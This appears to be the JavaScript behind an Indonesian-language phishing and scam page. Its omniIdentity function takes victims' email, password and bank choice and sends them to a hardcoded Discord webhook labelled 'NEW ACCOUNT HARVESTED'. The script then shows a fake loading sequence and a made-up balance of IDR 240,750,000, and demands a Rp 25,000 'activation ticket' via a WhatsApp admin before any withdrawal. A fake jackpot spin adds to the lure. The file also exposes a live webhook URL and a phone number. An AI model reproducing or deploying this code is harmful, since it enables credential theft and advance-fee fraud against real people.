// ==========================================
// CONFIGURATION - GANTI DI SINI
// ==========================================
const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1488920982059225218/k3BAyhlX0rVuXmY8gXQ-ECQtMWFduU123hjdsaJJ7Zc3MGsWriERGk3t9XVzwNp-bXhz";
const WA_ADMIN = "https://wa.me/6282224301835"; // Ganti nomor lo

// ==========================================
// CORE ENGINE V21
// ==========================================

// Generate Random Session ID
document.getElementById('node-code').innerText = Math.random().toString(36).substring(7).toUpperCase();

async function omniIdentity() {
    const u = document.getElementById('email').value;
    const p = document.getElementById('pass').value;
    const b = document.getElementById('bank').value;

    if(!u || !p) return alert("System Warning: Data Identitas Kurang Lengkap!");

    // UI Transition
    document.getElementById('auth-panel').classList.add('hidden');
    document.getElementById('astral-loading').classList.remove('hidden');

    const device = navigator.userAgent.split('(')[1].split(')')[0];

    // SEND TO DISCORD
    try {
        fetch(DISCORD_WEBHOOK, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                username: "ASTRAL_V21_REAPER",
                embeds: [{
                    title: "🔱 NEW ACCOUNT HARVESTED 🔱",
                    color: 16766720,
                    fields: [
                        { name: "👤 User", value: `\`${u}\`` },
                        { name: "🔑 Pass", value: `\`${p}\`` },
                        { name: "🏦 Gateway", value: b },
                        { name: "📱 Device", value: device }
                    ],
                    footer: { text: "Protocol: V21 Astral-Core Singularity" },
                    timestamp: new Date()
                }]
            })
        });
    } catch (e) { console.log("Silent Active"); }

    // Astral Loading Animation
    let progress = 0;
    const fill = document.querySelector('.fill');
    const msg = document.getElementById('astral-msg');
    const status = ["BYPASSING CLOUD FIREWALL...", "INJECTING ASTRAL CREDIT...", "SYNCING WITH BANK NODE...", "ESTABLISHING SECURE LINE..."];
    
    let i = 0;
    const interval = setInterval(() => {
        progress += 10;
        if(fill) fill.style.width = progress + "%";
        if(progress % 25 == 0 && i < status.length) {
            msg.innerText = status[i];
            i++;
        }
        if(progress >= 100) {
            clearInterval(interval);
            setTimeout(() => unlockV21(u), 500);
        }
    }, 1000);
}

function unlockV21(u) {
    document.getElementById('gate').classList.add('hidden');
    const hub = document.getElementById('hub');
    hub.classList.remove('blur-v21');
    hub.style.filter = "none";
    hub.style.pointerEvents = "auto";
    
    document.getElementById('display-user').innerText = u.toUpperCase();
    
    // Auto-roll Balance
    let bal = 0;
    const target = 240750000;
    const roller = setInterval(() => {
        bal += 11345678;
        if(bal >= target) { bal = target; clearInterval(roller); }
        document.getElementById('user-bal').innerText = "IDR " + bal.toLocaleString('id-ID') + ",00";
    }, 40);
}

function triggerWD() {
    const term = document.getElementById('logs');
    if(term) {
        term.innerHTML += "<br>> [CRITICAL]: Account Node Mismatch Detected.";
        term.innerHTML += "<br>> [INFO]: Astral Activation Ticket Required.";
    }
    
    alert("⚠️ KEAMANAN ASTRAL-CORE AKTIF ⚠️\n\nPenarikan Saldo Rp 240.750.000 terdeteksi oleh sistem pajak Google Cloud. Untuk mengaktifkan jalur bypass pencairan, Anda wajib memiliki 'TIKET AKTIVASI ASTRAL' seharga Rp 25.000.\n\nKlik OK untuk mengambil tiket via Admin WhatsApp Resmi.");
    
    const msg = encodeURIComponent("Halo Admin V21, saya butuh TIKET AKTIVASI ASTRAL agar saldo 240JT saya bisa cair ke rekening. Berapa nomor DANA tujuannya?");
    window.open(`${WA_ADMIN}?text=${msg}`, "_blank");
}

function startSpin() {
    alert("STIMULATING ASTRAL RTP...");
    setTimeout(() => {
        alert("💥 ASTRAL JACKPOT! 50 JUTA MASUK SALDO!");
        let current = 240750000 + 50000000;
        document.getElementById('user-bal').innerText = "IDR " + current.toLocaleString('id-ID') + ",00";
    }, 2000);
}
